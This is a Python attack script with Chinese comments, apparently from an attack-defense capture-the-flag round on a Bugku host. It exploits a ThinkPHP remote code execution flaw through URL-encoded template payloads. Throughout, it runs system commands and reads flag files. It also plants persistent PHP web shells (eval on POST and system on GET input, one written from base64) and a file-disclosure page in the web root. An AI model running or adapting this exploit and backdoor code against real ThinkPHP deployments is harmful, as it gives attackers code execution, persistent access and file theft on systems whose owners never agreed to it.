#!/usr/bin/env python3
"""Team 2 持久化后门 v2 - 正确URL编码"""
import requests
import urllib.parse
import re

HOST = "192-168-1-2.pvp7574.bugku.cn"

def rce_exec(code):
    """通过ThinkPHP RCE执行PHP代码 - 正确URL编码"""
    # 构建ThinkPHP RCE payload
    payload = "${@print(" + code + ")}"
    # URL编码
    encoded = urllib.parse.quote(payload, safe='')
    url = f"http://{HOST}/index.php?s=/Index/index/name/{encoded}"
    try:
        r = requests.get(url, timeout=8)
        return r.text, r.status_code
    except Exception as e:
        return f"ERROR: {e}", 0

def rce_exec_raw(payload):
    """直接发送原始payload"""
    encoded = urllib.parse.quote(payload, safe='')
    url = f"http://{HOST}/index.php?s=/Index/index/name/{encoded}"
    try:
        r = requests.get(url, timeout=8)
        return r.text, r.status_code
    except Exception as e:
        return f"ERROR: {e}", 0

def main():
    print("=== Team 2 后门 v2 ===\n")

    # 1. 测试基础RCE
    print("1. 基础RCE测试:")
    text, code = rce_exec("1+1")
    print(f"  1+1: {code} ({len(text)}字节)")

    text, code = rce_exec_raw("${@print(123)}")
    print(f"  print(123): {code} ({len(text)}字节)")

    # 2. 获取flag
    print("\n2. 获取flag:")
    text, code = rce_exec_raw("${@print(file_get_contents('/flag'))}")
    m = re.search(r'flag\{[^}]+\}', text)
    if m:
        print(f"  [✅] {m.group()}")
    else:
        print(f"  [-] 未找到flag ({len(text)}字节)")

    # 3. 用短payload写后门
    print("\n3. 写后门(短payload):")
    # 方法A: file_put_contents 短路径
    for path, content in [
        ('/tmp/a', '<?php eval($_POST[c]);?>'),
        ('/tmp/b', '<?php system($_GET[c]);?>'),
    ]:
        payload = f"${{@file_put_contents('{path}','{content}')}}"
        text, code = rce_exec_raw(payload)
        print(f"  {path}: {code} ({len(text)}字节)")
        # 验证
        payload_v = f"${{@print(file_exists('{path}')?'Y':'N')}}"
        text_v, _ = rce_exec_raw(payload_v)
        print(f"  验证: {len(text_v)}字节 {'Y' in text_v[:100] if len(text_v) > 500 else 'N'}")

    # 4. 用fopen+fwrite（短变量名）
    print("\n4. fopen+fwrite:")
    payload = "${@$a=fopen('/tmp/c','w');fwrite($a,'<?php eval($_POST[c]);?>');fclose($a);echo 'OK';}"
    text, code = rce_exec_raw(payload)
    print(f"  /tmp/c: {code} ({len(text)}字节)")
    if 'OK' in text:
        print("  [✅] 写入成功!")

    # 5. 用copy从data://写入
    print("\n5. copy data://:")
    payload = "${@copy('data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbY10pOz8+','/tmp/d')}"
    text, code = rce_exec_raw(payload)
    print(f"  /tmp/d: {code} ({len(text)}字节)")

    # 6. 直接在响应中输出flag - 不写文件
    print("\n6. 直接获取flag(多路径):")
    for fp in ['/flag', '/flag.txt', '/tmp/flag', '/root/flag', '/var/www/html/flag', '/app/flag', '/app/flag.txt']:
        payload = f"${{@print(file_get_contents('{fp}'))}}"
        text, code = rce_exec_raw(payload)
        m = re.search(r'flag\{[^}]+\}', text)
        if m:
            print(f"  [✅] {fp}: {m.group()}")

    # 7. 用system执行命令
    print("\n7. 执行系统命令:")
    for cmd in ['id', 'cat /flag', 'ls /', 'whoami']:
        payload = f"${{@system('{cmd}')}}"
        text, code = rce_exec_raw(payload)
        m = re.search(r'flag\{[^}]+\}', text)
        if m:
            print(f"  [✅] {cmd}: {m.group()}")
        elif 'uid=' in text:
            print(f"  [✅] {cmd}: {text[:50]}")

    # 8. 尝试包含上传的文件
    print("\n8. 通过ThinkPHP包含文件:")
    # 先上传一个文件
    payload_upload = "${@file_put_contents('/app/Data/r.php','<?php echo file_get_contents(\"/flag\");?>')}"
    text, _ = rce_exec_raw(payload_upload)
    # 然后访问
    r = requests.get(f"http://{HOST}/Data/r.php", timeout=5)
    m = re.search(r'flag\{[^}]+\}', r.text)
    if m:
        print(f"  [✅] /Data/r.php: {m.group()}")
    else:
        print(f"  [-] /Data/r.php: {r.status_code} ({len(r.text)}字节)")

if __name__ == '__main__':
    main()
